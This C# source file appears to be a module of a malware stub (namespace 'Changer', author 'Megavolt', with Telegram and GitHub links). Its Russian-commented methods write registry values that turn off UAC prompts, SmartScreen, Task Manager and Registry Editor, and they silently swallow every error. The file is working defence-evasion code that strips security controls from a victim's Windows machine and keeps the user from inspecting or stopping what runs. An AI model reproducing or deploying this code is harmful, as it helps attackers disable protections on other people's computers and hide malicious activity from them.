/* 
    Author : Megavolt
	Telegram Group : t.me/DOLFX
    Github : github.com/Megavolt666
	Telegram Author : t.me/megavoltcoder
*/
using Microsoft.Win32;
using stubOnion;
using System;

namespace Changer
{
    public class RegistryControl
    {
        /// <summary>
        /// Метод для проверки битности реестра
        /// </summary>
        public static RegistryView Regview { get { if (RunCheck.StartWin_xSixtyFour()) { return RegistryView.Registry64; } return RegistryView.Registry32; } }

        public static readonly string[] FieldsLocal = new string[]
        {
            "EnableLUA", "EnableInstallerDetection", "PromptOnSecureDesktop",
            "ConsentPromptBehaviorAdmin", "ConsentPromptBehaviorUser",
            "EnableSecureUIAPaths", "ValidateAdminCodeSignatures", "EnableSmartScreen",
            "EnableVirtualization", "EnableUIADesktopToggle", "FilterAdministratorToken"
        };

        public static readonly string[] FiledsSystem = new string[]
        {
            "ConsentPromptBehaviorAdmin", "DisableRegistryTools", "DisableTaskMgr"
        };

        /// <summary>
        /// Метод для отключения показа уведомления контроля учётных записей пользователя (UAC)
        /// Список ключей которые будут затронуты находится в FieldsLocal
        /// </summary>
        /// <param name="regpath">Путь к разделу реестра</param>
        /// <param name="locker">Параметр для отключения/включения</param>
        /// <returns>true/false</returns>
        public static bool ToogleUacAdmin(string regpath, int locker)
        {
            try
            {
                if (RunCheck.IsUserAdministrator())
                {
                    using (RegistryKey registry = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, Regview))
                    using (RegistryKey key = registry.OpenSubKey(regpath, RunCheck.StartWin_xSixtyFour()))
                    {
                        try
                        {
                            foreach (string v in FieldsLocal)
                            {
                                try
                                {
                                    key.SetValue(v, locker, RegistryValueKind.DWord);
                                }
                                catch { }
                            }
                        }
                        catch (Exception) { return false; }
                        return true;
                    }
                }
                return true;
            }
            catch (Exception) { return false; }
        }

        /// <summary>
        /// Метод для отключения Диспетчера Задач и Реестра 
        /// Список ключей которые будут затронуты находится в FiledsSystem
        /// </summary>
        /// <param name="regpath">Путь к разделу реестра</param>
        /// <param name="locker">Параметр для отключения/включения</param>
        /// <returns>true/false</returns>
        public static bool ToogleTaskMandRegedit(string regpath, int locker)
        {
            try
            {
                using (RegistryKey registry = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, Regview))
                using (RegistryKey key = registry.OpenSubKey(regpath, RunCheck.StartWin_xSixtyFour()))
                using (RegistryKey sxs = key.CreateSubKey("System"))
                {
                    sxs.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
                    sxs.SetValue("PromptOnSecureDesktop", 0, RegistryValueKind.DWord);
                    try
                    {
                        foreach (string k in FiledsSystem)
                        {
                            try
                            {
                                sxs.SetValue(k, locker);
                            }
                            catch { }
                        }
                    }
                    catch (Exception) { return false; }
                    return true;
                }
            }
            catch { return false; }
        }

        /// <summary>
        /// Метод для отключения SmartScreen Windows
        /// </summary>
        /// <param name="regpath">Путь к разделу реестра</param>
        /// <param name="name">Имя ключа</param>
        /// <param name="enable">Параметр для отключения/включения</param>
        /// <returns>true/false</returns>
        public static bool ToogleSmartScreen(string regpath, string name, string enable)
        {
            try
            {
                if (RunCheck.IsUserAdministrator())
                {
                    using (RegistryKey key = Registry.LocalMachine.OpenSubKey(regpath, true))
                    {
                        try
                        {
                            key.SetValue(name, enable, RegistryValueKind.String);
                            return true;
                        }
                        catch { return false; }
                    }
                }
                return true;
            }
            catch { return false; }
        }
    }
}
